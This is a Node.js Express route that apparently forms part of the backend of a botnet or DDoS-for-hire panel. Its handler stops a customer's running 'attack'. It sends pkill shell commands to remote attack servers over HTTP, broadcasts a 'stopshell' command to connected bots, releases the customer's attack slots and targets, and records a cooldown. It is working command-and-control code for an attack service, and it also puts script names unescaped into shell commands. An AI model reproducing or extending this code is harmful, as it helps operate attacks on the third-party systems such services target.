const express = require('express');
const router = express.Router();
const fs = require('fs');

router.get('/', async (req, res) => {
    const { token, id } = req.query;
    const { state, axiosClient, cooldownPath } = req.app.locals;

    if (!token || !id) return res.status(400).json({ status: 'error', message: 'missing parameters' });

    const tkn = token.toLowerCase();
    const attack = state.runningAttacks[id];
    if (!attack) return res.status(404).json({ status: 'error', message: 'attack not found' });
    if (attack.token !== tkn) return res.status(403).json({ status: 'error', message: 'unauthorized' });

    // ── Kill Static Servers ──────────────────────────────────────────────────
    if (attack.servers && attack.servers.length > 0) {
        const killCmd = attack.scriptNames.map(name => `pkill -f "${name}"`).join('; ');
        await Promise.allSettled(attack.servers.map(srv => axiosClient.post(srv.host + '/', { command: killCmd }).catch(() => {})));
    }

    // ── Kill Bots ───────────────────────────────────────────────────────────
    if (typeof global.broadcastBots === 'function' && state.bots.size > 0) {
        attack.scriptNames.forEach(name => global.broadcastBots({ type: 'cmd', cmd: 'stopshell', args: name, meta: { attackId: id } }));
    }

    clearTimeout(attack.timerId);

    // ── State Cleanup ───────────────────────────────────────────────────────
    const idx = state.activeTargets[tkn]?.indexOf(attack.normalizedTarget);
    if (idx > -1) state.activeTargets[tkn].splice(idx, 1);
    state.globalActiveTargets.delete(attack.normalizedTarget);
    state.activeAttacks[tkn] = Math.max(0, state.activeAttacks[tkn] - attack.slotCount);

    if (state.activeAttacks[tkn] === 0) {
        state.cooldownData[tkn] = state.cooldownData[tkn] || {};
        state.cooldownData[tkn].last_attack = new Date().toISOString();
        fs.writeFileSync(cooldownPath, JSON.stringify(state.cooldownData, null, 2));
    }

    delete state.runningAttacks[id];

    res.json({ status: 'success', message: 'attack stopped', data: { id, target: attack.target } });
});

module.exports = router;

